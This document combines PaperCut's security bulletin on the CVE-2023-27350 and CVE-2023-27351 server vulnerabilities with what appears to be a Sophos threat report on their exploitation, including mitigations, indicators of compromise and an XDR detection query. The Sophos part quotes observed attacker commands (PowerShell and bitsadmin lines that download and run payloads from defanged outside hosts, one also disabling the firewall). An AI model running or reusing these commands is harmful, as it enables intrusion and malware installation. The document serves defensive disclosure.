![info icon](https://cdn1.papercut.com/web/img/icon/alert-info-blue-icon.svg)
info

For other Security vulnerability and Security bulletin information, see our [Security vulnerability information and common security questions](https://www.papercut.com/kb/Main/CommonSecurityQuestions/) page.

We have received two vulnerability reports from a 3rd party cyber security company ([Trend Micro](#acknowledgements)), for high/critical severity security issues in PaperCut MF/NG. **We have evidence to suggest that unpatched servers are being exploited in the wild.**

* Remote Code Execution vulnerability (CVE-2023–27350 / ZDI-CAN-18987 / ZDI-23–233)
* User account data vulnerability (CVE-2023–27351 / ZDI-CAN-19226 / ZDI-23–232)

![danger icon](https://cdn1.papercut.com/web/img/icon/alert-important-icon.svg)
Critical

Please note that as of 18th April, 2023 (see “When was the exploit first detected in the wild?” in the [FAQs](#faqs)) we have evidence to suggest that unpatched servers are being exploited in the wild, (particularly ZDI-CAN-18987 / PO-1216 / ZDI-23–233).

Our immediate advice is to upgrade your PaperCut Application Servers to one of the fixed versions listed below if you haven’t already.

If you suspect that your server has been compromised, we recommend taking server backups, then wiping the Application Server, and rebuilding the Application Server and restoring the database from a ‘safe’ backup point prior to when you discovered any suspicious behavior. We have also updated the [FAQ](#faqs) “How do I know if my server has been exploited?” question below.

## ZDI-CAN-18987 / PO-1216 / ZDI-23–233

*(also identified as CVE-2023–27350)*

We have confirmed that under certain circumstances this allows for an unauthenticated attacker to get Remote Code Execution (RCE) on a PaperCut Application Server. This could be done remotely and without the need to log in.

*This vulnerability has been rated with a CVSS score of 9.8.*

## ZDI-CAN-19226 / PO-1219 / ZDI-23–232

*(also identified as CVE-2023–27351)*

We have confirmed that under certain circumstances this allows for an unauthenticated attacker to potentially pull information about a user stored within PaperCut MF or NG - including usernames, full names, email addresses, office/department info and any card numbers associated with the user. The attacker can also retrieve the hashed passwords for **internal** PaperCut-created users only (note that this does **not** include any password hashes for users sync’d from directory sources such as Microsoft 365 / Google Workspace / Active Directory and others). This could be done remotely and without the need to log in. We do not have any evidence of this vulnerability being used against customers at this point.

*This vulnerability has been rated with a CVSS score of 8.2.*

Yes, the [New PaperCut RCE exploit created that bypasses existing detections](https://www.bleepingcomputer.com/news/security/new-papercut-rce-exploit-created-that-bypasses-existing-detections/) article is referring to exploiting the same vulnerability, in a way that the activity is not easily detected in the Sysmon or PaperCut MF application log. The method of exploiting PaperCut MF mentioned in the article is mitigated in versions 20.1.7, 21.2.11, and 22.0.9 and later.

Q Is there more information available about these vulnerabilities?

Not at this time - to give customers a chance to upgrade, we are not releasing further details about these vulnerabilities.

Trend Micro have also advised they will disclose further information (TBD) about the vulnerability on 10th May 2023. For more information, see [<https://www.zerodayinitiative.com/advisories/upcoming/>](https://www.zerodayinitiative.com/advisories/upcoming/) (filter on “PaperCut”).

CISA have published an [Advisory](https://www.cisa.gov/news-events/alerts/2023/05/11/cisa-and-fbi-release-joint-advisory-response-active-exploitation-papercut-vulnerability) with additional information on 11th May 2023.

Q If we can’t upgrade to security patch, what other options are there?

Particularly if you have an older application version that doesn’t have a minor patch available, we highly recommend locking down network access to the server(s).

* Block all inbound traffic from external IPs to the web management port (port 9191 and 9192 by default)
* Block all traffic inbound to the web management portal on the firewall to the server. Note: this will prevent lateral movement from internal hosts but management of the PaperCut service can only be performed on that asset.
* Apply “Allow list” restrictions under Options > Advanced > Security > Allowed site server IP addresses. Set this to only allow the IP addresses of verified Site Servers on your network. Note this only addresses ZDI-CAN-19226 / PO-1219

Q How do I know if my server has been exploited?

We currently recommend looking for the following Indicators of Compromise (IOCs) to determine if it is likely that the vulnerability has been used to install malware on the system. Depending on your systems, logging and endpoint protection software you may be able to detect the following.

* If you see suspicious activity or security alerts in Antivirus, anti-malware and endpoint security software tooling.
* If you see suspicious PaperCut MF application log entries, ie:

  + User “admin” logs into the administration interface
  + Admin user “admin” modified the print script on the printer
  + User “admin” updated the config key “…” (where the config key is not one you’ve deliberately changed)
  + User “[setup-wizard]” modified a config key
  + If your Application Server server logs happen to be in debug mode, check to see if there are lines mentioning `SetupCompleted` at a time not correlating with the server installation or upgrade. Server logs can be found e.g. in `[app-path]/server/logs/*.*` where `server.log` is normally the most recent log file.
* Domains in DNS or web proxy logs:

If you suspect that your server has been compromised, we recommend taking server backups, then wiping the Application Server, and rebuilding the Application Server and restoring the database from a ‘safe’ backup point prior to when you discovered any suspicious behavior. In addition we recommend you implement your security response procedures and carry out best practices around potential compromise. Also see the “How do I retain my data when restoring my Application Server?” question below.

We will update this question with more details as we find more information from our customer base and security community.

Q How do I retain my data when restoring my Application Server?

Depending on how far back you need to restore your backup from, you may want to restore balances or other data changes in the gap between the last safe backup, and now.

There’s some options for the restore process and subsequent data retention below:

1. Restore App Server and Database to a clean backup (**Recommended option**)

   * This would involve restoring the Application Server and database from a ‘safe’ backup point prior to when you discovered any suspicious behavior.
   * If you don’t require the data changes between the safe backup and now, you’re all set.
2. Restore App Server and Database, then update user balances (**Safe option**)

   * To restore recent user balances, we recommend restoring the latest (current) database backup containing all of the latest data, onto a staging machine that’s running a patched version of the Application Server, and is not connected to the network. You can then use this environment to export your user balances, and then import them into the production (restored) system.
   * To export user balance / user credit data from your off-network system, run a user report - e.g. in the PaperCut MF/NG admin interface, head to **Reports > User > User reports > User list** then select the **CSV** report format. This will generate a list of your users and their current balances.
   * Then use the detailed information on the [Batch import and update user data](https://www.papercut.com/help/manuals/ng-mf/applicationserver/user-import-update/) article to format the data into the correct columns, then import/update the data in your production system.
3. Restore App Server, and retain your most recent database

   * If you need to keep all your reporting data as well as user balance data and other changes to the database, you will need to manually clean a copy of your potentially compromised database.
   * We recommend restoring the latest (current) database backup containing all of the latest data, onto a staging machine that’s running a patched version of the Application Server, and is not connected to the network.
   * On that system, ensure that you clean/check the following:
     + Set config key [print-and-device.script.enabled](https://www.papercut.com/kb/Main/EnablingPrintScriptingDeviceScripting) is set to N (if you’re not using print or device scripting)
     + Set config key [device.script.sandboxed](https://www.papercut.com/kb/Main/EnablingPrintScriptingDeviceScripting) is set to Y (the recommended default)
     + Set config key [print.script.sandboxed](https://www.papercut.com/kb/Main/EnablingPrintScriptingDeviceScripting) is set to Y (the recommended default)
     + Delete any [device scripts](https://www.papercut.com/help/manuals/ng-mf/common/script-device-create/) or [print scripts](https://www.papercut.com/help/manuals/ng-mf/common/script-create/) which have been configured, in case they have been tampered with.
     + Ensure that your user lists and other PaperCut MF/NG settings match with what you expect to see in your environment.
   * Once you are confident that the staging machine settings are clean, perform a database export from the staging environment, then import that cleaned database data into the production environment.

Q Is there a maintenance release for versions 19 or older?

No - versions 19 and older are now “end of life”, as documented on our [End of Life Policy](https://www.papercut.com/kb/Main/EndOfLifePolicy) page.

We recommend purchasing an updated license, which you can do [online if you’re using PaperCut NG](https://www.papercut.com/buy/), or [through your PaperCut Partner](https://www.papercut.com/products/mf/how-to-get/) if you’re using PaperCut MF. You can find your PaperCut Partner contact information through the ‘About’ or ‘Help’ tab in the PaperCut administration interface.

Q I have a version 20 license, but no current M&S (maintenance and support) - can I still get this fix?

Yes! As long as you are running a version which is currently supported (version 20 or later) you can upgrade to whichever maintenance release version you’re licensed for. For example if you are licensed for version 20 but you don’t have a valid license for version 21, you can update to version 20.1.7 as above. See the ‘Where can I get the upgrade?’ question above for more details.

See our [Upgrade Policy](https://www.papercut.com/kb/Main/UpgradePolicy) page for more information on licensing and upgrades.

Sophos X-Ops MDR and SophosLabs teams have been monitoring and researching activity around the PaperCut vulnerability CVE-2023-27350 since April 13, 2023. In this posting we outline our observations on the threat environment around this vulnerability.

On April 19, 2023, software company PaperCut published an update to their [advisory](https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) indicating exploitation of CVE-2023-27350 has been reported in the wild. PaperCut offers multi-platform print management software, popular in the education sector. The vulnerability leveraged in the attack was in fact already addressed by a patch released the month prior – a situation commonly called an *n*-day attack.

This vulnerability affects PaperCut MF and NG Application and Site Servers version 8.0 and above across all supported operating systems. A patch was made available on March 8 and Sophos recommends that you [apply it](https://www.papercut.com/kb/Main/Upgrading#application-server-upgrade) at the earliest opportunity on all vulnerable servers.

Sophos’ earliest observation of an affected user occurred on April 13. That attack was identified by a SophosLabs threat researcher when Cobalt Strike was detected during post-exploitation activity. On April 17 — four days later and two days prior to the public announcement — Sophos MDR detected exploitation of a vulnerable PaperCut server at a customer in North America. We quickly contained the affected server and engaged the customer to proceed with remediation.

To date, we have observed multiple threat groups target potential victims globally, with an overweight percentage in the educational sector.

On July 25. 2023, an [additional vulnerability was reported to PaperCut](https://www.papercut.com/kb/Main/securitybulletinjuly2023/) by  researchers. That vulnerability, [CVE-2023-39143,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39143) affects  PaperCut NG/MF running on Windows, prior to version 22.1.3, and could result in the reading and writing of arbitrary files to the PaperCut server via  two separate path traversal techniques–meaning that if a server was exposed to the Internet directly, bad actors could potentially both access data shared on the server and write malicious files (such as web shells) to the server. A fix is available for PaperCut versions 22.1.3 or later on Windows, but all previous versions remain vulnerable. Sophos has not yet seen any exploitation of this vulnerability, but recommends the application of the patch as early as possible to avoid potential exploitation.

### Technical Details

The vulnerability details provided by Trend Micro’s [ZDI](https://www.zerodayinitiative.com/advisories/ZDI-23-233/) indicate that the code allowing authentication bypass and remote code execution is found in the SetupCompleted Java class. At the time of exploitation, Sophos MDR observed the following error log being generated:

[![Two error messages spotted early in the PaperCut attack](https://news.sophos.com/wp-content/uploads/2023/04/figure-01.jpg)](https://news.sophos.com/wp-content/uploads/2023/04/figure-01.jpg)

*Figure 1: Error messages are an early sign that something is amiss*

Post-exploitation activity often results in PowerShell commands being executed by the pc-app.exe parent process, as seen in Figure 2 downloading Atera remote monitoring software to the victim. (Atera is of course legitimate software, seen in this situation being abused by the attackers.).

[![PowerShell downloading a copy of Atera](https://news.sophos.com/wp-content/uploads/2023/04/figure-too.png)](https://news.sophos.com/wp-content/uploads/2023/04/figure-too.png)

*Figure 2: PowerShell download of legitimate-but-abused Atera software*

This is just one example observed, as different threat groups execute PowerShell in a variety of ways.

```
powershell  IEX ((New-Object Net.WebClient).DownloadString ('http://137.184.56[.]77:443/for.ps1'))

powershell.exe Invoke-WebRequest http://137.184.56.[]77:443/c.bat

-OutFile c.bat

powershell $url="https://tmpfiles[.]org/dl/1337855/enc.txt" $dst="C:\encexe" netsh advfirewall set allprofiles state off Invoke-WebRequest $url -OutFile $dst Start-Process $dst -windowstyle hidden Start-Sleep -s 10
```

Sophos MDR has also observed the use of BITSAdmin, a commonly abused [LOLBin](https://news.sophos.com/en-us/2023/04/25/2023-active-adversary-report-for-business-leaders/), to download additional tools.

```
bitsadmin /transfer dwa /download /priority FOREGROUND http[:]//23.184.48[.]17/bootcamp.zip C:\ProgramData\bootcamp.zip

bitsadmin /transfer mydownloadjob /download /priority normal http[:]//192.184.35[.]216:443/4591187629.exe %WINDIR%setup2.exe
```

The tools exploited in the attacks have included what we refer to as “dual-use agents,” used both legitimately by IT staff and maliciously by attackers. At the time of writing, Sophos has observed the abuse of AnyDesk, Atera, Synchro, TightVNC, NetSupport, and DWAgent remote management tools across multiple campaigns.

Additionally, some of the final payloads overlap with previously reported threats such as Truebot (downloader, often linked to Cl0p ransomware), Buhti (ransomware), MoneroOcean ([coinminer](https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/)), and Mirai (botnet). One such example of a miner, shown in Figure 3, details the commands to kill other miners before launching their own Monero (XMR) mining software.

### Determining impact with Sophos XDR

Upon receiving updated threat intelligence, Sophos MDR threat hunters immediately started searching across our customer base for any additional affected users. The following SQL query can be used by Sophos XDR customers in their Sophos Central console to identify any suspicious activity, as well as be converted into a Sigma rule for non-Sophos customers. Generally, command-line executions performing system discovery with native tools (LOLBins) such as whoami, nltest, and systeminfo can indicate compromise and lead to the point of initial access. If suspicious commands are observed, it is recommended to perform system isolation while the system is under investigation. Note that a common false positive observed in the process activity was the PaperCut print archive function.

```
SELECT

date_format(from_unixtime(TIME,'%Y-%m-%d %H:%i:%s') AS date_time,

customer_id,

         meta_hostname,

         parent_name,

         parent_cmdline,

         name,

         cmdline,

         sophos_pid

FROM

            xdr_data

WHERE

            AND query_name = 'running_processes_windows_sophos'

            AND LOWER(parent_name) = 'pc-app.exe'

            AND (LOWER(name) = 'cmd.exe'

                   OR LOWER(name) = 'powershell.exe')
```

As noted above, a patch is available; this situation falls into the category of attacks known as “*n*-days” – an exploit that appears very soon after a patch is issued. Potentially affected users are encouraged to review and apply the patch as soon as possible. Our GitHub [includes](https://github.com/sophoslabs/IoCs/blob/master/papercut-nday-indicators-of-compromise.csv) a set of Indicators of Compromise associated with this attack campaign. Sophos Labs continues to monitor the situation closely for potential AV detections.

### Timeline and Further Sophos Resources

As our investigation continues, we’ve developed a (simplified) timeline of PaperCut-related events as they unfolded in our data. In addition, there’s more information about PaperCut on the [Naked Security blog](https://nakedsecurity.sophos.com/2023/04/25/papercut-security-vulnerabilities-under-active-attack-vendor-urges-customers-to-patch/) (which includes a tidy checklist for PaperCut customers) and the [Naked Security podcast](https://nakedsecurity.sophos.com/2023/04/27/s3-ep132-proof-of-concept-lets-anyone-hack-at-will/).
